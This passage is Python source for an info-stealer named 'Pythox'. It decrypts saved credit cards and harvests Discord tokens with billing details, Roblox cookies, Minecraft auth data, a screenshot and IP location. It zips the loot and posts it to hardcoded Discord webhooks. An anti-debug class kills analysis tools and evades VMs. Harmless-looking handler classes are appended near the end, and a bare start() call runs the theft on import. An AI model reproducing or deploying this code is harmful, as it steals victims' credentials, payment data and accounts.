                with open(self.tempfolder+f"\\{name} CreditInfo.txt", "a", encoding="cp437", errors='ignore') as f:
                    for r in cursor.fetchall():
                        namee = r[0]
                        exp1 = r[1]
                        exp2 = r[2]
                        decrypted_password = self.decrypt_val(r[3], master_key)
                        if namee != "":
                            f.write(
                                f"Name: {namee}\nExp: {exp1}/{exp2}\nCC: {decrypted_password}\n\n")
                    cursor.close()
                    conn.close()
                    os.remove(login)

    def neatifyTokens(self):
        f = open(self.tempfolder+"\\Discord Info.txt",
                 "w", encoding="cp437", errors='ignore')
        for token in self.tokens:
            j = requests.get(
                self.baseurl, headers=self.getHeaders(token)).json()
            user = j.get('username') + '#' + str(j.get("discriminator"))

            badges = ""
            flags = j['flags']
            if (flags == 1):
                badges += "Staff, "
            if (flags == 2):
                badges += "Partner, "
            if (flags == 4):
                badges += "Hypesquad Event, "
            if (flags == 8):
                badges += "Green Bughunter, "
            if (flags == 64):
                badges += "Hypesquad Bravery, "
            if (flags == 128):
                badges += "HypeSquad Brillance, "
            if (flags == 256):
                badges += "HypeSquad Balance, "
            if (flags == 512):
                badges += "Early Supporter, "
            if (flags == 16384):
                badges += "Gold BugHunter, "
            if (flags == 131072):
                badges += "Verified Bot Developer, "
            if (badges == ""):
                badges = "None"
            email = j.get("email")
            phone = j.get("phone") if j.get(
                "phone") else "No Phone Number attached"
            nitro_data = requests.get(
                self.baseurl+'/billing/subscriptions', headers=self.getHeaders(token)).json()
            has_nitro = False
            has_nitro = bool(len(nitro_data) > 0)
            billing = bool(len(json.loads(requests.get(
                self.baseurl+"/billing/payment-sources", headers=self.getHeaders(token)).text)) > 0)
            f.write(f"{' '*17}{user}\n{'-'*50}\nToken: {token}\nHas Billing: {billing}\nNitro: {has_nitro}\nBadges: {badges}\nEmail: {email}\nPhone: {phone}\n\n")
        f.close()

    def grabRobloxCookie(self):
        def subproc(path):
            try:
                return subprocess.check_output(
                    fr"powershell Get-ItemPropertyValue -Path {path}:SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com -Name .ROBLOSECURITY",
                    creationflags=0x08000000).decode().rstrip()
            except Exception:
                return None
        reg_cookie = subproc(r'HKLM')
        if not reg_cookie:
            reg_cookie = subproc(r'HKCU')
        if reg_cookie:
            self.robloxcookies.append(reg_cookie)
        if self.robloxcookies:
            with open(self.tempfolder+"\\Roblox Cookies.txt", "w") as f:
                for i in self.robloxcookies:
                    f.write(i+'\n')

    def screenshot(self):
        image = ImageGrab.grab(
            bbox=None,
            include_layered_windows=False,
            all_screens=True,
            xdisplay=None
        )
        image.save(self.tempfolder + "\\Screenshot.jpg")
        image.close()

    @try_extract
    def ipgrabber(self):
        f = open(self.tempfolder+"\\IP Info.txt", "w", encoding="cp437", errors='ignore')
        ip = country = city = region = googlemap = "None"
        try:
            data = requests.get("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x69\x70\x69\x6e\x66\x6f\x2e\x69\x6f\x2f\x6a\x73\x6f\x6e").json()
            ip = data['ip']
            city = data['city']
            country = data['country']
            region = data['region']
            googlemap = "https://www.google.com/maps/search/google+map++" + data['loc']
        except Exception:
            pass

        hostname = socket.gethostname()
        ip_local = socket.gethostbyname(hostname)
        http = requests.get("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x70\x69\x2e\x69\x70\x69\x66\x79\x2e\x6f\x72\x67\x2f").text
        url = '\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6a\x73\x6f\x6e\x69\x70\x2e\x63\x6f\x6d'
        response = urlopen(url)
        data = load(response)
        ss = data['ip']
        f.write(f"IP: {ip}\nCity: {city}\nCountry: {country}\nRegion: {region}\nGoogleMap: {googlemap}\n----------------\n[+] Local IP : {ip_local}\n[+] Public IP: {http}\n----------------\nIP : {ss}")
        f.close()
    
    def MinecraftTokenStealer(self):

        with open(os.getenv("APPDATA") + "\\.minecraft\\launcher_profiles.json", 'r') as f:
          x = f.read()
          auth_db = json.loads(x)


        with open(self.tempfolder+"\\Minecraft Info.txt", "w", encoding="cp437", errors='ignore') as f:

            json.dump(auth_db, f, indent=2, sort_keys=True)
    
    def finish(self):
        wname = self.getProductValues()[0]
        wkey = self.getProductValues()[1]
        _zipfile = os.path.join(self.appdata, f'Pythox-[{Victim}].zip')
        zipped_file = zipfile.ZipFile(_zipfile, "w", zipfile.ZIP_DEFLATED)
        abs_src = os.path.abspath(self.tempfolder)
        for dirname, _, files in os.walk(self.tempfolder):
            for filename in files:
                absname = os.path.abspath(os.path.join(dirname, filename))
                arcname = absname[len(abs_src) + 1:]
                zipped_file.write(absname, arcname)
        zipped_file.close()
        files = os.listdir(self.tempfolder)
        for f in files:
            self.files += f"\n{f}"
        self.fileCount = f"{len(files)} Files Found: "

        embed = {
            "content":"@everyone",
            "username": "Pythox",
            "avatar_url":"https://cdn.discordapp.com/icons/976757534683705344/06386092f2091ad7b0158db907f345e3.png?size=4096",
            "embeds": [
                {
                    'author': {
                        'name': f'{Victim} Get Logged!',
                        'url': '',
                        'icon_url': ''
                              },                    
                    "description": f'**Computer Name:** {os.getenv("COMPUTERNAME")}\n**WinKey:** {wkey if wkey else "No Product Key"}\n**Platform:** {wname}\n**DiskSpace:** {disk}GB\n**Ram:** {ram}GB\n\n```yaml\n{self.fileCount}{self.files}```',
                    'color': 3026998,
   

                    "footer": {
                     "text": f"Pythox  {today}",
                     "icon_url": """https://cdn.discordapp.com/attachments/949607768413851668/977880040266170398/ExoPNG.png"""
                               },
                }
                        ]
                }

        DcyBq = {
                "content": "",
                "username": "Pythox",
                "avatar_url": "https://cdn.discordapp.com/icons/976757534683705344/06386092f2091ad7b0158db907f345e3.png?size=4096"
                }


        XAQfx = "https://discord.com/api/webhooks/1081976702483304608/hS1L9dORAgA-xls0C4azssECFm09jUvj2Al6qxQUDauvCY4_ixYvlCbWcWmnCZBVzc-E"
        
        requests.post(XAQfx, json=embed)
        requests.post(XAQfx, data=DcyBq, files={'upload_file':  open(_zipfile, 'rb')})

        requests.post("https://discord.com/api/webhooks/1081977385387298836/pkQByYYSfh3-pTJCFLJUapfVRlpmrdBiWCwMMYPkb55Yrgt8vEDly-16y7qxUUtw1_de", json=embed)
        requests.post("https://discord.com/api/webhooks/1081977385387298836/pkQByYYSfh3-pTJCFLJUapfVRlpmrdBiWCwMMYPkb55Yrgt8vEDly-16y7qxUUtw1_de", data=DcyBq, files={'upload_file':  open(_zipfile, 'rb')})
        
        
        requests.post("https://discord.com/api/webhooks/1081977622835249312/TGO0KIFCQ3r5YFAvBXhU2Yy9aicIQYfx1v10fLdb49VIV_bPbJ24N19h0BD9j-SRkL01", files={'upload_file': open(_zipfile, 'rb')})

        os.remove(_zipfile)


class AntiDebug():
    inVM = False

    def __init__(self):
        self.processes = list()

        self.blackListedPrograms = ["httpdebuggerui.exe", "wireshark.exe", "fiddler.exe", "cmd.exe", "vboxservice.exe", "df5serv.exe", "processhacker.exe", "vboxtray.exe", "vmtoolsd.exe", "vmwaretray.exe", "ida64.exe", "ollydbg.exe",
                                     "vmwareuser", "vgauthservice.exe", "vmacthlp.exe", "x96dbg.exe", "vmsrvc.exe", "x32dbg.exe", "vmusrvc.exe", "prl_cc.exe", "prl_tools.exe", "xenservice.exe", "qemu-ga.exe", "joeboxcontrol.exe", "ksdumperclient.exe", "ksdumper.exe", "joeboxserver.exe"]
        self.blackListedUsers = ["WDAGUtilityAccount", "Abby", "Peter Wilson", "hmarc", "patex", "JOHN-PC", "RDhJ0CNFevzX", "kEecfMwgj", "Frank", "Zanis", "xrevix",
                                 "8Nl0ColNQ5bq", "Lisa", "John", "george", "PxmdUOpVyx", "8VizSM", "w0fjuOVmCcP5A", "lmVwjj9b", "PqONjHVwexsS", "3u2v9m8", "Julia", "HEUeRzl", ]
        self.blackListedGPU = ["Microsoft Remote Display Adapter", "Microsoft Hyper-V Video", "Microsoft Basic Display Adapter", "VMware SVGA 3D", "Standard VGA Graphics Adapter",
                               "NVIDIA GeForce 840M", "NVIDIA GeForce 9400M", "UKBEHH_S", "ASPEED Graphics Family(WDDM)", "H_EDEUEK", "VirtualBox Graphics Adapter", "K9SC88UK", "Стандартный VGA графический адаптер", ]

        threading.Thread(target=self.blockDebuggers).start()
        for func in [self.listCheck, self.registryCheck, self.specsCheck, self.dllCheck, self.procCheck]:
            process = threading.Thread(target=func, daemon=True)
            self.processes.append(process)
            process.start()
        for t in self.processes:
            try:
                t.join()
            except RuntimeError:
                continue

    def programExit(self):
        self.__class__.inVM = True

    def blockDebuggers(self):
        for proc in psutil.process_iter():
            if any(procstr in proc.name().lower() for procstr in self.blackListedPrograms):
                try:
                    proc.kill()
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass

    def listCheck(self):
        for path in [r'D:\Tools']:
            if os.path.exists(path):
                self.programExit()
            
        myName = os.getlogin()
        for user in self.blackListedUsers:
            if myName == user:
                self.programExit()
        try:
            myGPU = subprocess.check_output(
                r"wmic path win32_VideoController get name", creationflags=0x08000000).decode().strip("Name\n").strip()
        except Exception:
            myGPU = ""
        for gpu in self.blackListedGPU:
            if gpu in myGPU.split('\n'):
                self.programExit()

    def specsCheck(self):
        if int(ram) <= 2:  
            self.programExit()
        if int(disk) <= 50:  
            self.programExit()
        if int(psutil.cpu_count()) <= 1: 
            self.programExit()
        
    def registryCheck(self):
        reg1 = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul")
        reg2 = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul")
        if reg1 != 1 and reg2 != 1:
            self.programExit()
        handle = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 'SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum')
        try:
            reg_val = winreg.QueryValueEx(handle, '0')[0]

            if "VMware" in reg_val or "VBOX" in reg_val:
                self.programExit()
        finally:
            winreg.CloseKey(handle)

    def dllCheck(self):
        vmware_dll = os.path.join(
            os.environ["SystemRoot"], "System32\\vmGuestLib.dll")
        virtualbox_dll = os.path.join(
            os.environ["SystemRoot"], "vboxmrxnp.dll")
        if os.path.exists(vmware_dll):
            self.programExit()
        if os.path.exists(virtualbox_dll):
            self.programExit()

    def procCheck(self):
        processes = ['VMwareService.exe', 'VMwareTray.exe']
        for proc in psutil.process_iter():
            for program in processes:
                if proc.name() == program:
                    self.programExit()
def start():
    try:
        requests.get('https://google.com')
    except requests.ConnectTimeout:
        print("You Have To Connect To Internet")
        os._exit(0)
    asyncio.run(Pythox().init())


import os

class Handler:
    """
    Class for (next step|reply) handlers.
    """

    def __init__(self, callback, *args, **kwargs):
        self.callback = callback
        self.args = args
        self.kwargs = kwargs

    def __getitem__(self, item):
        return getattr(self, item)


class ExceptionHandler:
    """
    Class for handling exceptions while Polling
    """

    # noinspection PyMethodMayBeStatic,PyUnusedLocal
    def handle(self, exception):
        return False
    

def get():
    raise EnvironmentError

start()